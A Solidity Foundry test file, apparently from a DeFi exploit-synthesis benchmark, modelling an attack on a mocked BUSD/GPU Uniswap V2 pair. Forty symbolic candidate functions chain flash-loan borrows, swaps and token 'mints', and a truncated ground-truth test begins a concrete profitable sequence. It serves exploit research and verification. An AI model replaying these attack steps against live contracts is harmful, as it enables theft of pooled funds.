// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {GPU} from "./GPU.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract GPUTest is Test, BlockLoader {
    BUSD busd;
    GPU gpu;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address gpuAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1715162496;
    uint112 reserve0pair = 32666057895841703902864;
    uint112 reserve1pair = 30903990987461173215594;
    uint32 blockTimestampLastpair = 1715157349;
    uint256 kLastpair = 1000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 3593172380488441457328771074525154312554;
    uint256 price1CumulativeLastpair = 3413984338485409116007014517744538854;
    uint256 totalSupplybusd = 3979997892719565019731285863;
    uint256 balanceOfbusdpair = 32666057895841703902864;
    uint256 balanceOfbusdattacker = 0;
    uint256 totalSupplygpu = 1000000000000000000000000;
    uint256 balanceOfgpupair = 30903990987461173215594;
    uint256 balanceOfgpuattacker = 0;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        gpu = new GPU(address(this), address(busd));
        gpuAddr = address(gpu);
        pair = new UniswapV2Pair(
            address(busd),
            address(gpu),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        busd.transfer(address(pair), balanceOfbusdpair);
        gpu.transfer(address(pair), balanceOfgpupair);
        vm.warp(10 ** 24 + 18 * 30 * 86400);
        gpu.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(gpu), address(busd), gpu.decimals());
        emit log_string("");
        emit log_string("Gpu Balances: ");
        queryERC20BalanceDecimals(address(busd), address(gpu), busd.decimals());
        queryERC20BalanceDecimals(address(gpu), address(gpu), gpu.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(pair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(address(gpu), address(pair), gpu.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(gpu),
            address(attacker),
            gpu.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_gpu_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        gpu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gpu_owner(uint256 amount) internal eurus {
        gpu.transfer(owner, amount);
    }

    function borrow_busd_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_pair(uint256 amount) internal eurus {
        busd.transfer(address(pair), amount);
    }

    function borrow_gpu_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        gpu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gpu_pair(uint256 amount) internal eurus {
        gpu.transfer(address(pair), amount);
    }

    function swap_pair_attacker_busd_gpu(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_gpu_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        gpu.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function mint_gpu_attacker(uint256 amount) internal eurus {
        gpu.transfer(address(attacker), amount);
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        swap_pair_attacker_gpu_busd(amt3, amt4);
        payback_busd_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_owner(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_pair(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_owner(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_pair(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        swap_pair_attacker_gpu_busd(amt3, amt4);
        swap_pair_attacker_busd_gpu(amt5, amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        swap_pair_attacker_gpu_busd(amt3, amt4);
        payback_busd_owner(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        swap_pair_attacker_gpu_busd(amt3, amt4);
        payback_busd_pair(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_owner(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_owner(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_owner(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_pair(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_pair(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_pair(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_owner(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_pair(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_owner(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_owner(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_owner(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        swap_pair_attacker_gpu_busd(amt9, amt10);
        payback_busd_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_pair(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_pair(amt3);
        mint_gpu_attacker(amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        payback_busd_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        payback_gpu_pair(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        swap_pair_attacker_gpu_busd(amt9, amt10);
        payback_busd_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        swap_pair_attacker_gpu_busd(amt3, amt4);
        swap_pair_attacker_busd_gpu(amt5, amt6);
        payback_gpu_owner(amt7);
        mint_gpu_attacker(amt8);
        swap_pair_attacker_gpu_busd(amt9, amt10);
        payback_busd_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        swap_pair_attacker_gpu_busd(amt3, amt4);
        swap_pair_attacker_busd_gpu(amt5, amt6);
        payback_gpu_pair(amt7);
        mint_gpu_attacker(amt8);
        swap_pair_attacker_gpu_busd(amt9, amt10);
        payback_busd_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_owner(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_owner(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_owner(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_pair(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_pair(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_owner(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        payback_busd_pair(amt3);
        mint_gpu_attacker(amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        payback_busd_pair(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_pair(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_owner(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        swap_pair_attacker_busd_gpu(amt9, amt10);
        payback_gpu_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_owner(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        payback_gpu_pair(amt7);
        mint_gpu_attacker(amt8);
        payback_gpu_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        payback_gpu_pair(amt5);
        mint_gpu_attacker(amt6);
        swap_pair_attacker_gpu_busd(amt7, amt8);
        swap_pair_attacker_busd_gpu(amt9, amt10);
        payback_gpu_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        payback_gpu_owner(amt9);
        mint_gpu_attacker(amt10);
        payback_gpu_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_gpu_owner(amt0);
        swap_pair_attacker_gpu_busd(amt1, amt2);
        swap_pair_attacker_busd_gpu(amt3, amt4);
        swap_pair_attacker_gpu_busd(amt5, amt6);
        swap_pair_attacker_busd_gpu(amt7, amt8);
        payback_gpu_pair(amt9);
        mint_gpu_attacker(amt10);
        payback_gpu_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_busd_owner(22_600 ether);
        printBalance("After step0 ");
        swap_pair_attacker_busd_gpu(
            22_600 ether,
            pair.getAmountOut(22_400 ether, address(busd))
        );
        printBalance("After step1 ");
